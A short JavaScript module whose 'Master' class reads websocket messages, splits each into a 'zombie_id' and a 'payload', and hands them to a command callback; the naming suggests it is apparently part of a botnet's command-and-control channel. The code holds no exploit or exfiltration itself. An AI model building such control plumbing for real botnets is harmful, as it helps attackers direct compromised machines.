
"use strict";

module.exports = (function(){

	class Master
	{
		constructor(websocket)
		{
            this.ws = websocket;
            this.oncommand = function() { };
            var self = this;
            this.ws.on("message", function(message){
            	self.onMessage(message);
            });
		}

		on(evt, callback)
		{
			if(evt == "command")
				this.oncommand = callback;
		}

		onMessage(message)
		{
            var data = message.utf8Data.split("\r\n");
            var zombie_id = data[0];
            var payload = data[1];
            this.oncommand(zombie_id, payload);
		}
	}

    return Master;
})();